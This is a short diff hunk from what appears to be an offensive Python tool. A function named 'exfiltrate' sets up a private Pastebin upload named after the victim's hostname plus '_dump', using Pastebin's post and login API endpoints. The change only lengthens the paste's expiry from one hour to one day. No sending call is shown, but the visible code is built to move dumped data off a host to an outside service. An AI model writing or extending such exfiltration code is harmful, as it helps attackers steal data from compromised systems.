@@ -18,7 +18,7 @@ def exfiltrate(paste_text):
 	data_format = "json"
 	paste_name = hostname + "_dump"
 	private = 2
-	expire_date = "1H"
+	expire_date = "1D"
 	url = "https://pastebin.com/api/api_post.php"
 	login_url = "https://pastebin.com/api/api_login.php"
 
